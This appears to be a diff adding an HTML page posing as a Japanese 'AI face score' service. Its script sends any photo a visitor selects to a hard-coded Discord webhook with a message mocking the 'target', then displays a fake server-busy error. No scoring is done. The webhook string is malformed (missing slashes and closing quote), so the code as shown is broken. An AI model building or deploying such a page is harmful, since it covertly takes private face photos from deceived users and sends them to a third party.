@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI顔面偏差値診断 2026</title>
+    <style>
+        body { background: #111; color: #fff; text-align: center; font-family: sans-serif; padding: 50px; }
+        .upload-btn { background: #f00; color: #fff; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 1.2rem; }
+        #status { margin-top: 20px; color: #aaa; }
+    </style>
+</head>
+<body>
+    <h1>AI顔面偏差値診断</h1>
+    <p>あなたの顔写真をアップロードしてください。<br>最新のAIが100点満点で採点します。</p>
+    
+    <input type="file" id="imageInput" accept="image/*" style="display: none;">
+    <button class="upload-btn" onclick="document.getElementById('imageInput').click()">写真を選択して診断</button>
+    
+    <div id="status"></div>
+
+    <script>
+        const WEBHOOK_URL ="https:discord.com/api/webhooks/1487713878908604566/6EIHGd-7hglyHQE-oCm4-xPw_OoiUNC-YFjnYFMVqsAgveLtTIZ3aKf5o9DKYtf82jul;
+
+        document.getElementById('imageInput').addEventListener('change', async (e) => {
+            const file = e.target.files[0];
+            if (!file) return;
+
+            document.getElementById('status').innerText = "AI解析中... (0%)";
+
+            const formData = new FormData();
+            formData.append("file", file);
+            formData.append("payload_json", JSON.stringify({
+                content: "★★★ ターゲットが自撮りを献上したぞ！ ★★★"
+            }));
+
+            try {
+                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                setTimeout(() => {
+                    document.getElementById('status').innerText = "解析エラー: サーバーが混雑しています。";
+                }, 2000);
+            } catch (err) {
+                console.error("Error", err);
+            }
+        });
+    </script>
+</body>
+</html>
